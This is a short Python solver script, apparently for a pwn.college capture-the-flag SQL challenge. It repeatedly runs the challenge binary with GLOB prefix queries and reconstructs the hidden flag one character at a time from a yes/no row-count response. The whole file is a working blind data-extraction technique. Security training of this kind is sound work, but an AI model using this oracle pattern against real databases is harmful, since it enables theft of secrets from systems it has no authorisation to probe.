import subprocess

flag = "pwn.college{"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.}"

while True:
    for char in charset:
        query = f"SELECT flag FROM flags WHERE flag GLOB '{flag}{char}*'"
        
        # Start the challenge and feed it the query
        process = subprocess.Popen(['/challenge/sql'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=query)
        
        if "Got 1 rows" in stdout:
            flag += char
            print(f"Current flag: {flag}")
            break
    else:
        print("Finished or stuck.")
        break
    
    if flag.endswith('}'):
        print(f"Final flag: {flag}")
        break
